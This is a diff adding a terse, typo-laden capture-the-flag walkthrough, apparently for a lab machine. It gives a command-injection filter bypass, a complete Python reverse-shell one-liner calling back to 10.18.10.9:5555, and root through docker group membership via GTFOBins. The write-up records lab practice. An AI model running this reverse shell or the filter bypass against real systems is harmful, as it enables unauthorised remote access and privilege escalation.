@@ -1,0 +1,13 @@
+we saw a directory which was featuring the command we put in there so we tried all but it had some protections
+
+so we did xxd index and it gave result
+
+to get shell
+
+`p\ython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.10.9",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`
+
+we got shell and we laterally esc easily but on that acc there was nithing
+
+so we dropeed back to inital iuser and it was docker
+
+gtfobsn and root
